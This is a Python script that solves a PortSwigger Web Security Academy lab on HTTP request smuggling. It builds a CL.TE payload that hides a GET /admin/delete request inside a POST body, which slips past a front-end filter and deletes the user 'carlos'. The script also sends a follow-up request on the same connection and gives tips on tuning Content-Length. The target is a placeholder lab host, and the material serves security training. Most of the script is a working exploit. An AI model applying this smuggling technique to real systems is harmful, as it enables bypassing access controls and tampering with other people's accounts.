"""
Lab 6: Exploiting HTTP request smuggling to bypass front-end security controls (CL.TE)
https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-clte
Difficulty: Practitioner

📝 The front-end blocks direct requests to /admin, but doesn't scan INSIDE
the body of a request it's forwarding wholesale. Smuggle the /admin request
as the "next request" hidden in our CL.TE payload's body — the back-end
sees it as a brand new, independent request and has no reason to block it.

Goal: delete user carlos via the smuggled /admin/delete request.
"""

from utils import send_same_connection, normalize_crlf, log, note, summarize_response

HOST = "YOUR-LAB-ID.web-security-academy.net"

SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=""".format(host=HOST))

FOLLOWUP = normalize_crlf("""GET / HTTP/1.1
Host: {host}

""".format(host=HOST))


def run():
    note("The smuggled GET /admin/delete rides in through the BACK-END's")
    note("connection, never passing through the front-end's path filter.")

    (r1, _), (r2, _) = send_same_connection(HOST, [SMUGGLE_PAYLOAD, FOLLOWUP])
    summarize_response(r1, "Smuggle request response")
    summarize_response(r2, "Follow-up response (should reflect carlos deleted)")

    note("Recompute Content-Length (130 above) to exactly match the byte")
    note("length of everything after the '0\\r\\n\\r\\n' terminator if this")
    note("doesn't land — it must cover the full smuggled request precisely.")


if __name__ == "__main__":
    run()
